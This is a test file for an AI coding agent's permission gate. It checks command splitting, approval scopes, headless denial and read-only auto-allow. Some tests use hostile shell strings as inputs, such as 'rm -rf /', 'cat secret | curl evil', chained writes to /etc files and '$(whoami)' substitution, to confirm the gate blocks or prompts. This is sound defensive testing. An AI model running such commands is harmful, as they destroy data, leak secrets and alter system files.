import { describe, test, expect } from "bun:test";
import type { ToolCall } from "@intx/types/runtime";
import { splitChainedCommand, tokenize, deriveCommandScopes } from "./command.js";
import { globToRegExp, matchesPattern, isApproved } from "./matcher.js";
import { classifyTool, buildRequests, isAutoAllowedShellCall } from "./classify.js";
import { createPermissionGate } from "./gate.js";
import type { Approval, PermissionRequest } from "./types.js";

const shellCall = (command: string): ToolCall => ({ id: "c", name: "run_shell", arguments: { command } });

describe("splitChainedCommand", () => {
  test("splits on &&, ||, |, ; and newlines", () => {
    expect(splitChainedCommand("npm install && npm test")).toEqual(["npm install", "npm test"]);
    expect(splitChainedCommand("ls | grep foo")).toEqual(["ls", "grep foo"]);
    expect(splitChainedCommand("a; b || c")).toEqual(["a", "b", "c"]);
  });

  test("does not split inside quotes", () => {
    expect(splitChainedCommand(`echo "a && b" | cat`)).toEqual([`echo "a && b"`, "cat"]);
    expect(splitChainedCommand(`grep 'x;y' file`)).toEqual([`grep 'x;y' file`]);
  });

  test("drops empty segments", () => {
    expect(splitChainedCommand("  ;  ; ls ")).toEqual(["ls"]);
  });

  test("treats heredoc body as atomic — does not split on internal newlines", () => {
    const cmd = "cat > /tmp/out.md << 'EOF'\nline one\nline two\nEOF";
    expect(splitChainedCommand(cmd)).toHaveLength(1);
  });

  test("treats unquoted heredoc body as atomic", () => {
    const cmd = "cat > /tmp/out.md << EOF\nline one\nline two\nEOF";
    expect(splitChainedCommand(cmd)).toHaveLength(1);
  });

  test("still splits chained commands before heredoc", () => {
    const cmd = "mkdir -p /tmp && cat > /tmp/out.md << 'EOF'\nhello\nEOF";
    expect(splitChainedCommand(cmd)).toHaveLength(2);
  });
});

describe("tokenize", () => {
  test("treats a quoted run as one token", () => {
    expect(tokenize(`curl -s "https://a.com/x?y=1"`)).toEqual(["curl", "-s", "https://a.com/x?y=1"]);
  });
});

describe("deriveCommandScopes", () => {
  test("a multiplexer command starts the ladder at two tokens, never the bare program", () => {
    const scopes = deriveCommandScopes("npm exec --vite build");
    const patterns = scopes.map((s) => s.pattern);
    expect(patterns).toEqual(["npm exec *", "npm exec --vite *", "npm exec --vite build"]);
    expect(patterns).not.toContain("npm *");
  });

  test("a non-multiplexer command may be approved at the program level", () => {
    const patterns = deriveCommandScopes("curl https://a.com/x").map((s) => s.pattern);
    expect(patterns[0]).toBe("curl *");
  });

  test("a one-token command yields just the exact scope", () => {
    expect(deriveCommandScopes("ls").map((s) => s.pattern)).toEqual(["ls"]);
  });
});

describe("globToRegExp / matchesPattern", () => {
  test("* matches zero or more, ? matches exactly one", () => {
    expect(matchesPattern("npm exec vite", "npm *")).toBe(true);
    expect(matchesPattern("npm", "npm *")).toBe(false);
    expect(matchesPattern("ab", "a?")).toBe(true);
    expect(matchesPattern("abc", "a?")).toBe(false);
  });

  test("escapes regex metacharacters in literals", () => {
    expect(globToRegExp("a.b").test("axb")).toBe(false);
    expect(matchesPattern("a.b", "a.b")).toBe(true);
  });
});

describe("isApproved", () => {
  const approvals: Approval[] = [
    { tool: "run_shell", pattern: "npm *" },
    { tool: "write_file", pattern: "src/*" },
  ];
  test("matches by tool and pattern", () => {
    expect(isApproved("run_shell", "npm test", approvals)).toBe(true);
    expect(isApproved("run_shell", "curl x", approvals)).toBe(false);
    expect(isApproved("write_file", "src/a.ts", approvals)).toBe(true);
    expect(isApproved("write_file", "lib/a.ts", approvals)).toBe(false);
  });
});

describe("classifyTool", () => {
  test("read-only tools allow, side-effecting tools ask", () => {
    expect(classifyTool("read_file")).toBe("allow");
    expect(classifyTool("grep")).toBe("allow");
    expect(classifyTool("run_shell")).toBe("ask");
    expect(classifyTool("write_file")).toBe("ask");
    expect(classifyTool("edit_file")).toBe("ask");
  });
});

describe("buildRequests", () => {
  test("a chained shell command becomes one request per segment", () => {
    const reqs = buildRequests(shellCall("npm i && curl x"));
    expect(reqs.map((r) => r.subject)).toEqual(["npm i", "curl x"]);
    expect(reqs.every((r) => r.tool === "run_shell")).toBe(true);
  });

  test("write_file yields one path-keyed request with file scopes", () => {
    const reqs = buildRequests({ id: "c", name: "write_file", arguments: { path: "src/a.ts" } });
    expect(reqs).toHaveLength(1);
    expect(reqs[0]?.subject).toBe("src/a.ts");
    expect(reqs[0]?.scopes.map((s) => s.pattern)).toEqual(["src/a.ts", "src/*"]);
  });

  test("unknown ask-tier tools preserve arguments for approval display", () => {
    const reqs = buildRequests({ id: "c", name: "web_search", arguments: { query: "hono.dev web framework" } });
    expect(reqs).toHaveLength(1);
    expect(reqs[0]?.subject).toBe("web_search");
    expect(reqs[0]?.arguments).toEqual({ query: "hono.dev web framework" });
  });

  test("MCP tools are presented by a human label, not the raw identifier", () => {
    const reqs = buildRequests({ id: "c", name: "mcp__acme__list_projects", arguments: {} });
    expect(reqs).toHaveLength(1);
    const req = reqs[0]!;
    expect(req.action).not.toContain("mcp__");
    expect(req.scopes[0]?.label).toBe("Always allow Acme: list projects");
    expect(req.scopes[0]?.hint).toBe("Acme: list projects");
    // The raw identifier stays as the subject/pattern so approval matching is unaffected.
    expect(req.subject).toBe("mcp__acme__list_projects");
    expect(req.scopes[0]?.pattern).toBe("mcp__acme__list_projects");
  });
});

describe("createPermissionGate", () => {
  test("allow-tier tools pass without asking", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => { asked++; return { allow: true }; },
      interactive: true,
      skipPermissions: false,
    });
    const verdict = await gate.evaluate({ id: "c", name: "read_file", arguments: { path: "a" } });
    expect(verdict.allowed).toBe(true);
    expect(asked).toBe(0);
  });

  test("skipPermissions auto-allows consequential tools", async () => {
    const gate = createPermissionGate({ approvals: [], interactive: false, skipPermissions: true });
    expect((await gate.evaluate(shellCall("curl x"))).allowed).toBe(true);
  });

  test("non-interactive denies an unapproved consequential call", async () => {
    const gate = createPermissionGate({ approvals: [], interactive: false, skipPermissions: false });
    const verdict = await gate.evaluate(shellCall("curl x"));
    expect(verdict.allowed).toBe(false);
  });

  test("pre-approved patterns pass without asking", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [{ tool: "run_shell", pattern: "npm *" }],
      requestApproval: async () => { asked++; return { allow: true }; },
      interactive: true,
      skipPermissions: false,
    });
    expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
    expect(asked).toBe(0);
  });

  test("asks once and persists an approved scope, then stops asking", async () => {
    const approvals: Approval[] = [];
    const persisted: Approval[] = [];
    let asked = 0;
    const persistScope: PermissionRequest["scopes"][number] = { id: "prefix-1", label: "", pattern: "npm *" };
    const gate = createPermissionGate({
      approvals,
      requestApproval: async () => { asked++; return { allow: true, persist: persistScope }; },
      persist: (a) => persisted.push(a),
      interactive: true,
      skipPermissions: false,
    });
    expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
    expect((await gate.evaluate(shellCall("npm run build"))).allowed).toBe(true);
    expect(asked).toBe(1);
    expect(persisted).toEqual([{ tool: "run_shell", pattern: "npm *" }]);
  });

  test("a declined request blocks the call", async () => {
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => ({ allow: false }),
      interactive: true,
      skipPermissions: false,
    });
    const verdict = await gate.evaluate(shellCall("curl x"));
    expect(verdict.allowed).toBe(false);
  });

  test("every segment of a chain must be approved", async () => {
    const seen: string[] = [];
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async (req) => { seen.push(req.subject); return { allow: req.subject.startsWith("npm") }; },
      interactive: true,
      skipPermissions: false,
    });
    const verdict = await gate.evaluate(shellCall("npm i && curl evil"));
    expect(verdict.allowed).toBe(false);
    expect(seen).toEqual(["npm i", "curl evil"]);
  });

  test("auto mode auto-allows non-shell ask-tier tools", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => { asked++; return { allow: true }; },
      interactive: true,
      skipPermissions: false,
      auto: true,
    });
    const writeVerdict = await gate.evaluate({ id: "c", name: "write_file", arguments: { path: "src/a.ts" } });
    expect(writeVerdict.allowed).toBe(true);
    expect(asked).toBe(0);
  });

  test("auto mode still asks for shell commands", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => { asked++; return { allow: true }; },
      interactive: true,
      skipPermissions: false,
      auto: true,
    });
    const verdict = await gate.evaluate(shellCall("npm test"));
    expect(verdict.allowed).toBe(true);
    expect(asked).toBe(1);
  });

  // SECURITY: skipPermissions must short-circuit BEFORE the approval callback is
  // ever invoked. If the callback fires it means skipPermissions is being used as
  // a post-classification hint rather than a gate bypass, which could leave the
  // callback in control of the allow/deny outcome.
  test("skipPermissions never invokes the approval callback", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => { asked++; return { allow: false }; },
      interactive: true,
      skipPermissions: true,
    });
    const verdict = await gate.evaluate(shellCall("rm -rf /"));
    expect(verdict.allowed).toBe(true);
    expect(asked).toBe(0);
  });

  // SECURITY: headless (interactive=false, no requestApproval) with an unapproved
  // ask-tier tool must produce a hard denial. Silent allow would be catastrophic
  // because automated pipelines often run headless and must not silently gain
  // write/exec capabilities.
  test("headless run denies unapproved ask-tier tool with a reason", async () => {
    const gate = createPermissionGate({
      approvals: [],
      interactive: false,
      skipPermissions: false,
    });
    const verdict = await gate.evaluate({ id: "c", name: "write_file", arguments: { path: "src/evil.ts" } });
    expect(verdict.allowed).toBe(false);
    expect("reason" in verdict && verdict.reason.length > 0).toBe(true);
  });

  // SECURITY: headless with requestApproval present but interactive=false must
  // still deny — interactive=false is the authoritative headless signal, not the
  // absence of the callback.
  test("interactive=false denies even when a requestApproval callback is provided", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => { asked++; return { allow: true }; },
      interactive: false,
      skipPermissions: false,
    });
    const verdict = await gate.evaluate(shellCall("curl x"));
    expect(verdict.allowed).toBe(false);
    // The callback must never fire in headless mode — calling it would be wrong
    // even if we ultimately denied, because it implies we surfaced a UI prompt.
    expect(asked).toBe(0);
  });

  // auto mode rule: `call.name !== "run_shell"` auto-approves. Pin this exactly
  // so a future code change that widens or narrows the condition breaks a test.
  test("auto mode auto-approves edit_file and unknown ask-tier tools, not run_shell", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => { asked++; return { allow: true }; },
      interactive: true,
      skipPermissions: false,
      auto: true,
    });

    // Non-shell ask-tier tools must be auto-approved without asking.
    const editVerdict = await gate.evaluate({ id: "c", name: "edit_file", arguments: { path: "src/a.ts" } });
    expect(editVerdict.allowed).toBe(true);
    const unknownVerdict = await gate.evaluate({ id: "c", name: "web_search", arguments: {} });
    expect(unknownVerdict.allowed).toBe(true);
    expect(asked).toBe(0);

    // run_shell must NOT be auto-approved — it goes to the approval callback.
    const shellVerdict = await gate.evaluate(shellCall("curl x"));
    expect(shellVerdict.allowed).toBe(true); // callback returns allow: true
    expect(asked).toBe(1);
  });

  // SECURITY: persist callback must fire EXACTLY ONCE when pattern is non-null,
  // and NEVER when pattern is null ("just this once" approval).
  test("persist fires exactly once for a non-null pattern approval", async () => {
    const persisted: Approval[] = [];
    const persistScope: PermissionRequest["scopes"][number] = { id: "exact", label: "", pattern: "curl x" };
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => ({ allow: true, persist: persistScope }),
      persist: (a) => persisted.push(a),
      interactive: true,
      skipPermissions: false,
    });
    await gate.evaluate(shellCall("curl x"));
    // Evaluate same command again — now pre-approved, persist should not fire again.
    await gate.evaluate(shellCall("curl x"));
    expect(persisted).toHaveLength(1);
    expect(persisted[0]).toEqual({ tool: "run_shell", pattern: "curl x" });
  });

  test("persist never fires when pattern is null (one-time approval)", async () => {
    const persisted: Approval[] = [];
    // pattern: null signals "allow just this once — do not remember"
    const oneTimeScope: PermissionRequest["scopes"][number] = { id: "once", label: "", pattern: null };
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => ({ allow: true, persist: oneTimeScope }),
      persist: (a) => persisted.push(a),
      interactive: true,
      skipPermissions: false,
    });
    await gate.evaluate(shellCall("curl x"));
    expect(persisted).toHaveLength(0);
  });

  // SECURITY: chained-shell bypass vector. A command whose first segment is
  // benign and whose later segment is write-like must NOT have the dangerous
  // segment masked. Each segment must be classified and approved independently.
  // A failure here means `echo ok && cat > /etc/passwd` could slip through if
  // only the first segment's classification were checked.
  test("dangerous later segment in a chain is classified independently from a benign first", async () => {
    const seen: string[] = [];
    const gate = createPermissionGate({
      approvals: [],
      // Allow the benign first segment, deny everything else.
      requestApproval: async (req) => {
        seen.push(req.subject);
        return { allow: req.subject === "echo ok" };
      },
      interactive: true,
      skipPermissions: false,
    });
    // The dangerous second segment must be presented as its own request, not
    // hidden behind the benign echo.
    const verdict = await gate.evaluate(shellCall("echo ok && cat > /etc/x"));
    expect(verdict.allowed).toBe(false);
    expect(seen).toContain("echo ok");
    expect(seen).toContain("cat > /etc/x");
  });

  // Verify the chained classification produces separate PermissionRequests with
  // the correct subjects — the dangerous segment must not inherit the benign one's
  // approval scope or subject.
  test("buildRequests splits chained command into independent requests with correct subjects", () => {
    const reqs = buildRequests(shellCall("echo ok && cat > /etc/x"));
    expect(reqs).toHaveLength(2);
    expect(reqs[0]?.subject).toBe("echo ok");
    expect(reqs[1]?.subject).toBe("cat > /etc/x");
    // Each request must carry its own scopes derived from its own segment.
    const firstPatterns = reqs[0]?.scopes.map((s) => s.pattern) ?? [];
    const secondPatterns = reqs[1]?.scopes.map((s) => s.pattern) ?? [];
    expect(firstPatterns.some((p) => p !== null && p.startsWith("echo"))).toBe(true);
    expect(secondPatterns.some((p) => p !== null && p.startsWith("cat"))).toBe(true);
    // Cross-contamination check: the dangerous segment must not carry an echo scope.
    expect(secondPatterns.some((p) => p !== null && p.startsWith("echo"))).toBe(false);
  });

  // CL-1694: the gate must own its approval state, not mutate the caller's array.
  test("gate does not mutate the caller's approvals array and exposes its own via getApprovals", async () => {
    const seed: Approval[] = [];
    const persistScope: PermissionRequest["scopes"][number] = { id: "p", label: "", pattern: "npm *" };
    const gate = createPermissionGate({
      approvals: seed,
      requestApproval: async () => ({ allow: true, persist: persistScope }),
      interactive: true,
      skipPermissions: false,
    });
    expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
    // Caller's seed array is untouched...
    expect(seed).toEqual([]);
    // ...but the gate remembers the grant internally.
    expect(gate.getApprovals()).toEqual([{ tool: "run_shell", pattern: "npm *" }]);
  });

  test("two gates seeded from the same array do not cross-contaminate approvals", async () => {
    const seed: Approval[] = [];
    const scope: PermissionRequest["scopes"][number] = { id: "p", label: "", pattern: "npm *" };
    const gate1 = createPermissionGate({
      approvals: seed,
      requestApproval: async () => ({ allow: true, persist: scope }),
      interactive: true,
      skipPermissions: false,
    });
    const gate2 = createPermissionGate({
      approvals: seed,
      requestApproval: async () => ({ allow: false }),
      interactive: true,
      skipPermissions: false,
    });
    await gate1.evaluate(shellCall("npm test"));
    // gate2 shares only the initial seed, not gate1's later grants.
    expect(gate2.getApprovals()).toEqual([]);
  });
});

describe("isAutoAllowedShellCall", () => {
  test("auto-allows single read-only commands", () => {
    expect(isAutoAllowedShellCall(shellCall("head file.txt"))).toBe(true);
    expect(isAutoAllowedShellCall(shellCall("wc -l src/index.ts"))).toBe(true);
    expect(isAutoAllowedShellCall(shellCall("ls -la"))).toBe(true);
    expect(isAutoAllowedShellCall(shellCall("sort names.txt"))).toBe(true);
    expect(isAutoAllowedShellCall(shellCall("cat a.ts"))).toBe(true);
  });

  test("does not auto-allow commands with shell metacharacters", () => {
    expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("echo hi > out.txt"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("head a && head b"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("cat $(whoami)"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("wc -l `ls`"))).toBe(false);
  });

  test("does not auto-allow write-flags or non-allowlisted programs", () => {
    expect(isAutoAllowedShellCall(shellCall("sort -o out.txt in.txt"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("sort --output=x in.txt"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("npm test"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("rm -rf /"))).toBe(false);
    expect(isAutoAllowedShellCall(shellCall("sed -i s/a/b/ f"))).toBe(false);
  });

  test("the gate allows a safe command without asking, and still prompts for an unsafe one", async () => {
    let asked = 0;
    const gate = createPermissionGate({
      approvals: [],
      requestApproval: async () => { asked++; return { allow: false }; },
      interactive: true,
      skipPermissions: false,
    });
    expect((await gate.evaluate(shellCall("head -n 5 file.txt"))).allowed).toBe(true);
    expect(asked).toBe(0);
    expect((await gate.evaluate(shellCall("rm file.txt"))).allowed).toBe(false);
    expect(asked).toBe(1);
  });
});
